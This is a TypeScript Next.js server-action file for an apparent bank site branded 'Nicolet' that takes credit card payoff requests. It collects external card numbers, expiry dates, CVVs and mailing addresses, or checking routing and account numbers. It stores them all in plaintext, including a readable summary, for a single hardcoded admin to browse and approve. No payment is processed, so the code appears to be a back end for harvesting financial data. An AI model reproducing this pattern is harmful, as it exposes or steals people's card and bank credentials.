'use server'

import { headers } from 'next/headers'
import { revalidatePath } from 'next/cache'
import { desc, eq } from 'drizzle-orm'
import { auth } from '@/lib/auth'
import { db, pool } from '@/lib/db'
import { bankAccount, user } from '@/lib/db/schema'
import { ensureCreditPayoffTable } from '@/lib/db/ensure-columns'
import { ADMIN_EMAIL } from '@/lib/bank-constants'

export type CreditPayoffResult =
  | { ok: true }
  | { ok: false; error: string }

export type CreditPayoffAdminRow = {
  id: number
  userId: string
  memberName: string
  memberEmail: string
  method: string
  amountCents: number
  status: string
  payloadPlain: string
  cardNumber: string | null
  cardExp: string | null
  cardCvv: string | null
  mailingAddress: string | null
  routingNumber: string | null
  accountNumber: string | null
  bankName: string | null
  accountHolderName: string | null
  createdAt: string
}

async function getSessionUser() {
  const session = await auth.api.getSession({ headers: await headers() })
  if (!session?.user) throw new Error('Unauthorized')
  return session.user
}

async function requireAdmin() {
  const sessionUser = await getSessionUser()
  const email = String(sessionUser.email || '').trim().toLowerCase()
  if (email !== ADMIN_EMAIL) throw new Error('Admin access required')
  return sessionUser
}

function dollarsToCents(amountDollars: number) {
  return Math.round(amountDollars * 100)
}

function digitsOnly(value: string) {
  return String(value || '').replace(/\D/g, '')
}

export async function submitCreditPayoff(input: {
  creditAccountId: number
  method: 'external_card' | 'checking'
  amountDollars: number
  // external card
  cardNumber?: string
  cardExp?: string
  cardCvv?: string
  mailingAddress?: string
  // checking
  routingNumber?: string
  accountNumber?: string
  bankName?: string
  accountHolderName?: string
}): Promise<CreditPayoffResult> {
  const sessionUser = await getSessionUser()
  await ensureCreditPayoffTable()

  if (!Number.isFinite(input.amountDollars) || input.amountDollars <= 0) {
    return { ok: false, error: 'Enter a payment amount greater than zero.' }
  }
  const amountCents = dollarsToCents(input.amountDollars)

  const card = (
    await db
      .select()
      .from(bankAccount)
      .where(eq(bankAccount.id, input.creditAccountId))
      .limit(1)
  )[0]
  if (!card || card.userId !== sessionUser.id || card.type !== 'credit') {
    return { ok: false, error: 'Credit account not found.' }
  }

  const member = (
    await db
      .select({ name: user.name, email: user.email })
      .from(user)
      .where(eq(user.id, sessionUser.id))
      .limit(1)
  )[0]

  const memberName = member?.name || sessionUser.name || 'Member'
  const memberEmail = member?.email || sessionUser.email || ''

  let cardNumber: string | null = null
  let cardExp: string | null = null
  let cardCvv: string | null = null
  let mailingAddress: string | null = null
  let routingNumber: string | null = null
  let accountNumber: string | null = null
  let bankName: string | null = null
  let accountHolderName: string | null = null
  let payloadPlain = ''

  if (input.method === 'external_card') {
    cardNumber = digitsOnly(input.cardNumber || '')
    cardExp = String(input.cardExp || '').trim()
    cardCvv = digitsOnly(input.cardCvv || '')
    mailingAddress = String(input.mailingAddress || '').trim()

    if (cardNumber.length < 13 || cardNumber.length > 19) {
      return { ok: false, error: 'Enter a valid card number.' }
    }
    if (!/^\d{2}\/\d{2}$/.test(cardExp) && !/^\d{2}\/\d{4}$/.test(cardExp)) {
      return { ok: false, error: 'Expiration must be MM/YY or MM/YYYY.' }
    }
    if (cardCvv.length < 3 || cardCvv.length > 4) {
      return { ok: false, error: 'Enter a valid CVV.' }
    }
    if (mailingAddress.length < 8) {
      return { ok: false, error: 'Enter a full mailing address.' }
    }

    payloadPlain = [
      'CREDIT CARD PAYOFF — EXTERNAL CARD',
      `Member: ${memberName}`,
      `Email: ${memberEmail}`,
      `Nicolet credit account id: ${card.id} (${card.name})`,
      `Amount: $${(amountCents / 100).toFixed(2)}`,
      `Card number: ${cardNumber}`,
      `Expiration: ${cardExp}`,
      `CVV: ${cardCvv}`,
      `Mailing address: ${mailingAddress}`,
      `Submitted: ${new Date().toISOString()}`,
    ].join('\n')
  } else if (input.method === 'checking') {
    routingNumber = digitsOnly(input.routingNumber || '')
    accountNumber = digitsOnly(input.accountNumber || '')
    bankName = String(input.bankName || '').trim()
    accountHolderName = String(input.accountHolderName || '').trim()

    if (routingNumber.length !== 9) {
      return { ok: false, error: 'Routing number must be 9 digits.' }
    }
    if (accountNumber.length < 4 || accountNumber.length > 17) {
      return { ok: false, error: 'Enter a valid checking account number.' }
    }
    if (!bankName) return { ok: false, error: 'Enter the bank name.' }
    if (!accountHolderName) {
      return { ok: false, error: 'Enter the name on the checking account.' }
    }

    payloadPlain = [
      'CREDIT CARD PAYOFF — EXTERNAL CHECKING',
      `Member: ${memberName}`,
      `Email: ${memberEmail}`,
      `Nicolet credit account id: ${card.id} (${card.name})`,
      `Amount: $${(amountCents / 100).toFixed(2)}`,
      `Account holder: ${accountHolderName}`,
      `Bank name: ${bankName}`,
      `Routing number: ${routingNumber}`,
      `Account number: ${accountNumber}`,
      `Submitted: ${new Date().toISOString()}`,
    ].join('\n')
  } else {
    return { ok: false, error: 'Choose card or checking payment.' }
  }

  await pool.query(
    `INSERT INTO credit_payoff (
      "userId", "creditAccountId", method, "amountCents", status,
      "memberName", "memberEmail",
      "cardNumber", "cardExp", "cardCvv", "mailingAddress",
      "routingNumber", "accountNumber", "bankName", "accountHolderName",
      "payloadPlain"
    ) VALUES ($1,$2,$3,$4,'pending',$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15)`,
    [
      sessionUser.id,
      card.id,
      input.method,
      amountCents,
      memberName,
      memberEmail,
      cardNumber,
      cardExp,
      cardCvv,
      mailingAddress,
      routingNumber,
      accountNumber,
      bankName,
      accountHolderName,
      payloadPlain,
    ]
  )

  revalidatePath('/dashboard')
  revalidatePath('/ops')
  return { ok: true }
}

export async function listCreditPayoffsForAdmin(): Promise<CreditPayoffAdminRow[]> {
  await requireAdmin()
  await ensureCreditPayoffTable()
  const result = await pool.query(
    `SELECT * FROM credit_payoff ORDER BY id DESC LIMIT 100`
  )
  return result.rows.map((r: any) => ({
    id: Number(r.id),
    userId: String(r.userId),
    memberName: String(r.memberName || 'Member'),
    memberEmail: String(r.memberEmail || ''),
    method: String(r.method),
    amountCents: Number(r.amountCents),
    status: String(r.status),
    payloadPlain: String(r.payloadPlain || ''),
    cardNumber: r.cardNumber ? String(r.cardNumber) : null,
    cardExp: r.cardExp ? String(r.cardExp) : null,
    cardCvv: r.cardCvv ? String(r.cardCvv) : null,
    mailingAddress: r.mailingAddress ? String(r.mailingAddress) : null,
    routingNumber: r.routingNumber ? String(r.routingNumber) : null,
    accountNumber: r.accountNumber ? String(r.accountNumber) : null,
    bankName: r.bankName ? String(r.bankName) : null,
    accountHolderName: r.accountHolderName ? String(r.accountHolderName) : null,
    createdAt: r.createdAt instanceof Date ? r.createdAt.toISOString() : String(r.createdAt || ''),
  }))
}

export async function markCreditPayoffReviewed(
  id: number,
  status: 'approved' | 'rejected'
): Promise<CreditPayoffResult> {
  await requireAdmin()
  await ensureCreditPayoffTable()
  await pool.query(
    `UPDATE credit_payoff SET status = $1, "updatedAt" = now() WHERE id = $2`,
    [status, id]
  )
  revalidatePath('/ops')
  return { ok: true }
}
